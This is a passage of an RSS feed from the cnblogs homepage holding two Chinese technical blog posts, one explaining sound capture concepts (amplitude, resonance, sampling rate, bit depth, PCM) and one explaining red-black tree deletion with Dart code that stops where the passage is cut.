<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>多媒体开发（9）：声音采集的概念 | 振幅 | 频率 | 共振 | 电平化 - 广州小程</title>
<link>http://www.cnblogs.com/freeself/p/10600711.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/freeself/p/10600711.html</guid>
<description>&lt;p&gt;之前介绍通过ffmpeg程序来录制声音或图像，这个办法是一个操作的过程，很少涉及到概念上的东西。&lt;/p&gt;
&lt;p&gt;而&lt;strong&gt;本文，要介绍的是声音采集的一些流程与概念。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;声音的采集流程与概念，是枯燥的，你如果不想了解的话，到这里就可以退出阅读了。&lt;/p&gt;
&lt;p&gt;但是，小程也会尽量说一些有趣的现象来缓解这种枯燥。&lt;/p&gt;
&lt;p&gt;听得到的，或听不到的声音，抽象来说，都是模拟信号，也可以形象一点，叫能量波，因为声音是有能量的，而且有大小变化，呈波形状。平常听到的声音都是复杂的波形，不会像单一频率的声音那么干净（比如正弦波、方波之类），但为了便于分析，经常会抽象为简单的波形。&lt;/p&gt;
&lt;p&gt;注意，对于单频率的声音，能量虽然有大小变化，但这种变化并非一定听得出来。比如400hz，相当于小蜜蜂嗡嗡的频率，它是一个正弦波，它的能量会变大变小，但小程是听不出变化的，因为频率太高了，这跟独立的图片以较高帧率显示就成了连续的，是一个道理。&lt;/p&gt;
&lt;p&gt;声音有两个维度是很重要的，一个是能量，一个是频率。能量以时间为横向坐标，即某个时间点对应一个能量值（也叫振幅或气压），表现出来的就是波形图，也叫时域表示。&lt;/p&gt;
&lt;p&gt;说到能量，你一定听过“狮吼功”，有想起“包租婆”吗？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/%E5%A4%9A%E5%AA%92%E4%BD%93%E5%BC%80%E5%8F%91/%E5%A3%B0%E9%9F%B3%E9%87%87%E9%9B%86%E7%9A%84%E6%A6%82%E5%BF%B5/%E7%8B%AE%E5%90%BC%E5%8A%9F1.jpg&quot; alt=&quot;狮吼功1&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/%E5%A4%9A%E5%AA%92%E4%BD%93%E5%BC%80%E5%8F%91/%E5%A3%B0%E9%9F%B3%E9%87%87%E9%9B%86%E7%9A%84%E6%A6%82%E5%BF%B5/%E7%8B%AE%E5%90%BC%E5%8A%9F2.jpeg&quot; alt=&quot;狮吼功2&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;狮子吼天下至刚至强的少林七十二绝学之一。 清啸之下，犹如讯雷疾泻声闻数里，令敌肝胆剧烈，心惊胆战，震慑人心的不可思议之威力。&lt;br/&gt;     -- 小说&amp;lt;&amp;lt;狮子吼&amp;gt;&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;包租婆的狮吼功大家都见识过了，如果加上大喇叭，杀手榜第一的火云邪神都不是她对手。&lt;/p&gt;
&lt;p&gt;大喇叭是能量放大器，能量越大杀伤力越强。&lt;/p&gt;
&lt;p&gt;声音，是能量波，能推动耳膜，耳膜振动就听到声音。这个推动，跟用手去推动，是一个道理，都需要力道。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;声音的力道（也叫音量）用分贝来衡量。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1分贝是大部分人能分辨出的最小的声音，相当于3米外一只蚊子发出的嗡嗡声。&lt;/p&gt;
&lt;p&gt;读者平常面对面说话的音量是50分贝，它的能量是1分贝声音的大约10万倍，注意这不一个线性变化的关系。&lt;/p&gt;
&lt;p&gt;电钻打孔的音量大约有100分贝。&lt;/p&gt;
&lt;p&gt;演唱会现场音量可以去到137分贝，这时耳朵可以会疼。&lt;/p&gt;
&lt;p&gt;近距离炮弹产生的声音可达150分贝，这样强度的声音足以撕裂鼓膜。&lt;/p&gt;
&lt;p&gt;残暴的科学家曾经用高达180分贝的声音摧残过小白鼠，发现这样的声音可以震碎它们的肝脏。&lt;/p&gt;
&lt;p&gt;所以说，&lt;strong&gt;只要你喊得足够大声，世界都可以摧毁&lt;/strong&gt;。但是，一般人，都很难去到100分贝，但借助小喇叭是有可能的。&lt;/p&gt;
&lt;p&gt;注意，尖叫时的高音，只说明频率高，频率高会让耳朵觉得不舒服，但不会去到撕裂耳膜的程度，因为人声在高频率时，能量一般是很小的。如果既能高频率又能大能量，又能高音准，那就是“我是歌手”。&lt;/p&gt;
&lt;p&gt;注意，声音的大小（即响度）是一个心理感知的东西，很难说只受振幅的影响，很可能还跟频率（音调高低）及持续的时间，甚至对比度都有关系，所以不能说声音大小就是振幅，只能说振幅影响了声音大小。&lt;/p&gt;
&lt;p&gt;那么在嗓门不够大的情况下，还有办法让“破坏力”大起来吗？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们还有一招，就是共振&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;能量用的是振幅，则共振利用的是声音的另一个维度--频率。&lt;/p&gt;
&lt;p&gt;话说世间万物都有自然的振动频率，叫固有频率，就是一秒内固定会振动几次。如果推动物体的频率与物体的固定频率接近或等同，就叫共振。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;共振有多可怕？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;据说，特斯拉曾有一次满不在乎地告诉记者，他可以跑到帝国大厦，在很短时间内将它化为一堆碎砖烂瓦。而所用的机械只是一个微小的振荡器而已。特斯拉使用振荡器进行机械共振实验，曾使周围的一些建筑物产生了共振，最后他测出了房子的共振频率，但是同时他也发现了这个实验存在巨大的危险，连警察也被引来了。&lt;/p&gt;
&lt;p&gt;尼古拉·特斯拉是谁？据说是最接近神的人，或者被叫作外星人或未来人。是真是假，由各位读者判断。&lt;/p&gt;
&lt;p&gt;来看几个共振的实例。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/%E5%A4%9A%E5%AA%92%E4%BD%93%E5%BC%80%E5%8F%91/%E5%A3%B0%E9%9F%B3%E9%87%87%E9%9B%86%E7%9A%84%E6%A6%82%E5%BF%B5/%E5%A1%94%E6%9F%AF%E5%A7%86%E5%A4%A7%E6%A1%A5.gif&quot; alt=&quot;塔柯姆大桥&quot;/&gt;&lt;/p&gt;
&lt;p&gt;摘录，&lt;strong&gt;因大风引起的共振而塌毁的塔柯姆大桥&lt;/strong&gt;：&lt;/p&gt;
&lt;blockquote readability=&quot;16&quot;&gt;
&lt;p&gt;塔柯姆大桥位于美国华盛顿州的塔柯姆海峡，1940年7月1日建成通车，在大桥垮塌前，&lt;br/&gt;人们早就观察到这座桥的怪异之处，即使只是微风，这座桥也起伏的厉害，&lt;br/&gt;于是，它有了一个外号——舞动的格蒂。&lt;/p&gt;
&lt;p&gt;在大桥上行驶的车辆，会由于大桥上下起伏，导致小车一会儿看得见，&lt;br/&gt;一会儿看不见，而坐在车里的人，简直就像在坐过山车。&lt;br/&gt;当时，一个地方性的运动就是在有风的天气到塔柯姆大桥行车或走路。&lt;br/&gt;一些人为塔柯姆大桥的怪异“行为”感到不安，但是很多人却没当回事。&lt;/p&gt;
&lt;p&gt;“舞动的格蒂”就这样潇洒地舞动了4个月，终于到了它谢幕的那一天。&lt;br/&gt;1940年11月7日，那天的风速，还不到设计风速限值的三分之一，&lt;br/&gt;但塔柯姆大桥还是在风中四分五裂，舞完了它短暂的一生。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;摘录，&lt;strong&gt;因共振引起的火箭爆炸&lt;/strong&gt;：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;1995年１月２６日，我国“长征２号Ｅ”运载火箭发射美国研制的“亚太２号卫星”时，&lt;br/&gt;由于美方没有告之卫星的共振频率，而凑巧卫星的共振频率与火箭整流罩的&lt;br/&gt;共振频率相同，发射时，由于高空风速风向的剧烈变化，&lt;br/&gt;引起共振，造成星箭爆炸。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;《加油！向未来》第二季节目中，黄绮珊在舞台上一展“狮吼功”，只见随着她的高音响起，舞台一侧十几个玻璃杯同时被震碎，其画面之震撼令现场观众全都目瞪口呆。&lt;br/&gt;&lt;img src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/%E5%A4%9A%E5%AA%92%E4%BD%93%E5%BC%80%E5%8F%91/%E5%A3%B0%E9%9F%B3%E9%87%87%E9%9B%86%E7%9A%84%E6%A6%82%E5%BF%B5/%E9%BB%84%E5%A6%88%E7%8B%AE%E5%90%BC%E5%8A%9F1.jpeg&quot; alt=&quot;黄妈狮吼功1&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/%E5%A4%9A%E5%AA%92%E4%BD%93%E5%BC%80%E5%8F%91/%E5%A3%B0%E9%9F%B3%E9%87%87%E9%9B%86%E7%9A%84%E6%A6%82%E5%BF%B5/%E9%BB%84%E5%A6%88%E7%8B%AE%E5%90%BC%E5%8A%9F2.jpeg&quot; alt=&quot;黄妈狮吼功2&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个震碎玻璃的例子还是有疑点的，但这里不细说。石英玻璃的固定频率在20khz以上（其它材质的另说），人声达到这个频率也是有可能的，但达到这个频率后还要持续，并且一定要有较大的能量，才可能把玻璃震碎。&lt;/p&gt;
&lt;p&gt;最后，理解共振原理的最好的例子就是&lt;strong&gt;荡秋千&lt;/strong&gt;：&lt;br/&gt;&lt;img src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/%E5%A4%9A%E5%AA%92%E4%BD%93%E5%BC%80%E5%8F%91/%E5%A3%B0%E9%9F%B3%E9%87%87%E9%9B%86%E7%9A%84%E6%A6%82%E5%BF%B5/%E8%8D%A1%E7%A7%8B%E5%8D%83.jpeg&quot; alt=&quot;荡秋千&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在秋千荡到最高点，推它一下，它就会越荡越高，当然这个推的频率跟秋千的频率要一致。这就是共振效果。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;以上，小程介绍了声音的能量与频率两个维度的有趣的现象，那接下来就是正文了。&lt;/p&gt;
&lt;p&gt;之前介绍用ffmpeg来录制声音的，是应用层的实现，这次要介绍原理性的东西，而且不涉及录音师之类的工作，比如布mic、配音、拟音之类。&lt;/p&gt;
&lt;p&gt;自然界的声音转换成数字编码，要经过电平化、放大、采样、量化、编码。&lt;/p&gt;
&lt;h4 id=&quot;一电平化&quot;&gt;（一）电平化&lt;/h4&gt;
&lt;p&gt;比如，通过碳膜来对接声音。声音的能量推动话筒的碳膜，碳膜振动时触发跟它相连的电极，产生电信号。电平大小与碳膜的振幅相关，而这又与声音的能量（变化）有关。&lt;/p&gt;
&lt;h4 id=&quot;二放大&quot;&gt;（二）放大&lt;/h4&gt;
&lt;p&gt;通过话筒取到的电信号是微弱的，为了支持后续的处理，有必要通过放大电路把信号放大。&lt;/p&gt;
&lt;h4 id=&quot;三采样&quot;&gt;（三）采样&lt;/h4&gt;
&lt;p&gt;采样是模数转换（ADC）的过程，也就是把连续的电信号采样成离散的数值。&lt;/p&gt;
&lt;p&gt;这里有一个概念叫采样率，采样率就是一秒钟一个声道采多少个样本。比如采样率为44100hz，则表示一秒钟一个声道采集了44100个样本（数值），如果一个样本用2个字节（即16bit）来表示，则对于双通道的同时采集（相当于两个话筒输入），一秒钟占的字节数是：44100*2*2=176400，约176kB，这样采集下去，如果不作处理，则大小不是一般的磁盘与带宽能够接受得了的，所以才会有编码压缩的引入。&lt;/p&gt;
&lt;p&gt;那为什么不使用10hz来采集以减小体积呢？&lt;/p&gt;
&lt;p&gt;因为10hz不能还原或逼近原模拟信号（采集后的数据，最终是要播放即转换成模拟信号的）。这里有一个采样定理，即如果想还原出模拟信号，则采样率不能低于模拟信号的最高频率的2倍，也就是对于最高频率的一次全振动内，至少也要采到两个点。对于人耳来说，听到的频率范围是20hz到20khz，所以可以认为最高的模拟信号的频率为20khz，那么采样的频率就要达到40khz才能保证还原模拟信号。&lt;/p&gt;
&lt;p&gt;而至于常见的是44.1khz，而不是40khz，这跟索尼有关，当时索尼公司正是人生的巅峰，而他使用了这个值，行业就都跟风去了。&lt;/p&gt;
&lt;h4 id=&quot;四量化与编码&quot;&gt;（四）量化与编码&lt;/h4&gt;
&lt;p&gt;采样得到样本后，用多少二进制位去表示它，这个就是量化，而多少位则为量化精度（位深）。&lt;/p&gt;
&lt;p&gt;一般位深为16bit、24bit或32bit。&lt;/p&gt;
&lt;p&gt;对于16bit，2^16=65536，20log(65536)约等于96dB，也就是16bit能表示96分贝的能量变化。从安静环境的30dB到演唱会的120dB，96dB都基本能覆盖上了。16bit时的1bit就相当于6dB。&lt;/p&gt;
&lt;p&gt;24bit与32bit也是量化精度的选择，因为会比16bit更细腻，但占的空间也更大。&lt;/p&gt;
&lt;p&gt;极端一点，如果选择1bit来表示会怎么样？&lt;/p&gt;
&lt;p&gt;1bit只有两个值，即0跟1，那它对应的电平值就只有两个等级，比如0dB跟100dB，中间的音量都听不到，结果就是表示的0dB你听不到，而表示的100dB又基本不出现，于是就什么声音都听不到。如果用2bit来表现，就有4个值，对应的电平等级就有4级，但层次还是不分明，不能细腻地表示变化。&lt;/p&gt;
&lt;p&gt;这里的编码是指采样后电平值的表示方式。&lt;/p&gt;
&lt;p&gt;pcm（脉冲编码调制）是常用的音频编码方式，也就是对每个采样的样本，用最接近的电平值（电平值的范围由量化精度决定）去表示，每个样本互相独立。&lt;/p&gt;
&lt;p&gt;pcm也表示编码格式。pcm编码格式在表示上，还可以细分为很多种，比如pcm_s16be、pcm_f32le、pcm_alaw之类。&lt;/p&gt;
&lt;p&gt;显然，pcm编码是没有压缩的。&lt;/p&gt;
&lt;p&gt;除了pcm编码格式（同时pcm也表示一种采集方式），还有一种有名的编码格式叫DSD，以44100的64倍的频率去采样，而每一个样本用1bit去表示，并且样本彼此关联。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;总结一下，本文主要介绍的是声音的采集过程以及相关的概念，同时也介绍了声音的振幅与频率的概念。&lt;/strong&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;img src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/%E9%80%BB%E8%BE%91%E9%A2%98/%E4%BB%80%E4%B9%88%E8%81%8C%E4%B8%9A.png&quot; alt=&quot;今天笑了没？&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 26 Mar 2019 07:57:00 +0000</pubDate>
<dc:creator>广州小程</dc:creator>
<og:description>之前介绍通过ffmpeg程序来录制声音或图像，这个办法是一个操作的过程，很少涉及到概念上的东西。 而 本文，要介绍的是声音采集的一些流程与概念。 声音的采集流程与概念，是枯燥的，你如果不想了解的话，到</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/freeself/p/10600711.html</dc:identifier>
</item>
<item>
<title>红黑树的删除详解与思路分析——不同于教科书上的算法（dart语言实现） - Burkut</title>
<link>http://www.cnblogs.com/outerspace/p/10600105.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/outerspace/p/10600105.html</guid>
<description>&lt;p&gt;对于红黑树的删除，看了数据结构的书，也看了很多网上的讲解和实现，但都不满意。很多讲解都是囫囵吞枣，知其然，不知其所以然，讲的晦涩难懂。&lt;/p&gt;
&lt;p&gt;红黑树是平衡二叉树的一种，其删除算法是比较复杂的，因为删除后还要保持红黑树的特性。红黑树的特性如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;
&lt;ol&gt;&lt;li&gt;节点是红色或黑色。&lt;/li&gt;
&lt;li&gt;根是黑色。&lt;/li&gt;
&lt;li&gt;所有叶子都是黑色（叶子是NIL节点）。&lt;/li&gt;
&lt;li&gt;每个红色节点必须有两个黑色的子节点。（从每个叶子到根的所有路径上不能有两个连续的红色节点。）&lt;/li&gt;
&lt;li&gt;从任一节点到其每个叶子的所有简单路径都包含相同数目的黑色节点（简称黑高）。&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;因此，从红黑树最基础的特性出发，抛开教科书和网上的算法，画了无数张图，分析了多种可能的情况以后，经过归纳提炼，实现了不同于教科书上的删除算法。&lt;/p&gt;
&lt;p&gt;经过多次画图证明以后，笔者发现，红黑树的删除算法不是唯一的，不管如何调整，只要保证删除后还是一颗红黑树即可。&lt;/p&gt;
&lt;p&gt;因此，笔者实现的 删除思路和算法如下：&lt;/p&gt;
&lt;p&gt;　　1. 删除转移：（这部分是大路货，不是自己实现的）&lt;/p&gt;
&lt;div&gt;
&lt;ul&gt;&lt;li&gt;如果被删除节点有两个非空子节点，则用后继节点的值代替该节点的值，这样演变成了删除后继节点；否则转下一条；&lt;/li&gt;
&lt;li&gt;如果被删除节点一个或两个孩子都为空：若有非空孩子，则用非空孩子节点替代之；若无，直接删除；&lt;/li&gt;
&lt;li&gt;删除后继节点：后继节点的左孩子节点一定为空，右孩子可能为空；处理如上一条；&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;p&gt;　　删除转移的目的是为了简化删除操作，更是为了简化修复操作。因为删除转移后，最终待删除的节点最多只会有一个非空孩子。&lt;/p&gt;

&lt;p&gt;　　2. 删除后修复：&lt;/p&gt;
&lt;p&gt;　　2.1 简单的情况：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;
&lt;ul&gt;&lt;li&gt;若被删除节点为红色节点，不需修复；此时该节点一定为红色的叶子节点（可根据红黑树的特性证明）；&lt;/li&gt;
&lt;li&gt;若被删除的节点为黑色节点，且有一个非空子节点，则将其非空子节点颜色涂黑即可；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;　　　　对于以上两种简单的情况，做个说明：根据红黑树特性，非空子节点一定为红色节点，否则将违反特性；根据红黑树特性，在删除前，一颗红黑树&lt;span&gt;不可能&lt;/span&gt;出现以下几种情况：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1570858/201903/1570858-20190326144945952-1726406187.png&quot; alt=&quot;&quot;/&gt;（图片来自网络，感谢原作者。）&lt;/p&gt;
&lt;p&gt; 　　2.2 复杂的情况：删除后需要修复的。&lt;/p&gt;
&lt;p&gt;　　　　只有当被删除的节点为黑色叶子节点时，导致该节点所在的分支，少了一个黑色节点，树不再平衡，因此需要修复。&lt;/p&gt;
&lt;p&gt;　　　　修复的整体思路是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;ul&gt;&lt;li&gt;如果该节点的父节点、或兄弟节点、或兄弟节点的特定方向的子节点 中，有红色节点，则将此红色节点旋转过来，通过旋转、涂黑操作，保持自父节点以来的树的平衡；&lt;/li&gt;
&lt;li&gt;如果不满足上述条件，则通过旋转和变色操作，使其兄弟分支上也减少一个黑色节点，这样自父节点以来的分支保持了平衡，满足了条件，但对于父节点来说，其整个分支减少了一个黑色节点，需要递归向上处理，直至重新平衡，或者到达根节点；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　掌握了整体思路以后，就可编码实现了，编码中用了一些小技巧，合并了一些情况，代码比较简单易懂，阅读者可以根据代码的情况自己画图证明：&lt;/p&gt;
&lt;p&gt;　　说明：代码为dart语言实现，dart语法基本与Java一致，不清楚的地方可以参考：&lt;/p&gt;
&lt;p&gt;　　　　https://www.dartlang.org/guides/language/language-tour&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;  &lt;span&gt;&lt;span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;  bool delete(E value) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     var node =&lt;span&gt; find(value);
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (node == &lt;span&gt;null&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;    _delete(node);
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     _nodeNumbers--&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 删除转移 并修复&lt;/span&gt;
&lt;span&gt;11&lt;/span&gt;   &lt;span&gt;void&lt;/span&gt; _delete(RBTNode&amp;lt;E&amp;gt;&lt;span&gt; d) {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (d.left != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; d.right != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;       var s =&lt;span&gt; _successor(d);
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;       d.value =&lt;span&gt; s.value;
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;       d =&lt;span&gt; s;
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; 
&lt;span&gt;18&lt;/span&gt;     var rp = d.left ??&lt;span&gt; d.right;
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;     rp?.parent =&lt;span&gt; d.parent;
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (d.parent == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;       _root =&lt;span&gt; rp;
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (d ==&lt;span&gt; d.parent.left)
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;       d.parent.left =&lt;span&gt; rp;
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt;       d.parent.right =&lt;span&gt; rp;
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; 
&lt;span&gt;27&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (rp != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; &lt;span&gt;      rp.paintBlack();
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (d.isBlack &amp;amp;&amp;amp; d.parent != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;       _fixAfterDelete(d.parent, d.parent.left == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt; 
&lt;span&gt;33&lt;/span&gt;   RBTNode&amp;lt;E&amp;gt; _successor(RBTNode&amp;lt;E&amp;gt; d) =&amp;gt;
&lt;span&gt;34&lt;/span&gt;       d.right != &lt;span&gt;null&lt;/span&gt; ?&lt;span&gt; _minNode(d.right) : d.left;
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt; 
&lt;span&gt;36&lt;/span&gt;   RBTNode&amp;lt;E&amp;gt; _minNode(RBTNode&amp;lt;E&amp;gt; r) =&amp;gt; r.left == &lt;span&gt;null&lt;/span&gt; ?&lt;span&gt; r : _minNode(r.left);
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; 
&lt;span&gt;38&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; fix up after delete&lt;/span&gt;
&lt;span&gt;39&lt;/span&gt;   &lt;span&gt;void&lt;/span&gt; _fixAfterDelete(RBTNode&amp;lt;E&amp;gt;&lt;span&gt; p, bool isLeft) {
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;     var ch = isLeft ?&lt;span&gt; p.right : p.left;
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (isLeft) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果被删除节点是父节点p的左分支;&lt;/span&gt;
&lt;span&gt;42&lt;/span&gt;       &lt;span&gt;if&lt;/span&gt; (p.isRed) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果父节点为红，则兄弟节点ch一定为黑;&lt;/span&gt;
&lt;span&gt;43&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (ch.left != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; ch.left.isRed) {
&lt;/span&gt;&lt;span&gt;44&lt;/span&gt; &lt;span&gt;          p.paintBlack();
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt; &lt;span&gt;          _rotateRight(ch);
&lt;/span&gt;&lt;span&gt;46&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;47&lt;/span&gt; &lt;span&gt;        _rotateLeft(p);
&lt;/span&gt;&lt;span&gt;48&lt;/span&gt;       } &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (ch.isRed) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 兄弟节点为红，此时兄弟节点一定有两个非空黑色子节点;&lt;/span&gt;
&lt;span&gt;49&lt;/span&gt; &lt;span&gt;        p.paintRed();
&lt;/span&gt;&lt;span&gt;50&lt;/span&gt; &lt;span&gt;        ch.paintBlack();
&lt;/span&gt;&lt;span&gt;51&lt;/span&gt; &lt;span&gt;        _rotateLeft(p);
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt;         _fixAfterDelete(p, &lt;span&gt;true&lt;/span&gt;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 变换为父节点为红的情况，递归处理;&lt;/span&gt;
&lt;span&gt;53&lt;/span&gt;       } &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (ch.left != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; ch.left.isRed) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 父、兄均为黑，兄有红色左孩子;&lt;/span&gt;
&lt;span&gt;54&lt;/span&gt; &lt;span&gt;        ch.left.paintBlack();
&lt;/span&gt;&lt;span&gt;55&lt;/span&gt; &lt;span&gt;        _rotateRight(ch);
&lt;/span&gt;&lt;span&gt;56&lt;/span&gt; &lt;span&gt;        _rotateLeft(p);
&lt;/span&gt;&lt;span&gt;57&lt;/span&gt;       } &lt;span&gt;else&lt;/span&gt; { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 父兄均为黑，将父分支左右均减少一个黑节点，然后递归向上处理;&lt;/span&gt;
&lt;span&gt;58&lt;/span&gt; &lt;span&gt;        p.paintRed();
&lt;/span&gt;&lt;span&gt;59&lt;/span&gt; &lt;span&gt;        _rotateLeft(p);
&lt;/span&gt;&lt;span&gt;60&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (ch.parent != &lt;span&gt;null&lt;/span&gt;) _fixAfterDelete(ch.parent, ch ==&lt;span&gt; ch.parent.left);
&lt;/span&gt;&lt;span&gt;61&lt;/span&gt; &lt;span&gt;      }
&lt;/span&gt;&lt;span&gt;62&lt;/span&gt;     } &lt;span&gt;else&lt;/span&gt; { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; symmetric&lt;/span&gt;
&lt;span&gt;63&lt;/span&gt;       &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (p.isRed) {
&lt;/span&gt;&lt;span&gt;64&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (ch.right != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt; ch.right.isRed) {
